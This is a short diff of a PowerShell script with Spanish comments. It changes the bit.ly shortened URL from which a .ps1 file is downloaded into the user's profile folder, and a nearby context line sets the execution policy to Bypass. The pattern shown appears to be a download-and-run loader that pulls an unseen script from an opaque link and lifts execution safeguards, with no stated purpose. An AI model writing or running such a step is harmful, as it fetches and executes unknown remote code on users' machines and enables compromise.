@@ -16,7 +16,7 @@ if (!(Test-Path $syswPath)) {
 
 # Descargar el nuevo archivo
 $newFilePath = "$env:USERPROFILE\newFile.ps1"
-Invoke-WebRequest -Uri "https://bit.ly/497Zojh" -OutFile $newFilePath
+Invoke-WebRequest -Uri "https://bit.ly/3HVDrbb" -OutFile $newFilePath
 
 # Establecer la política de ejecución para el nuevo archivo
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
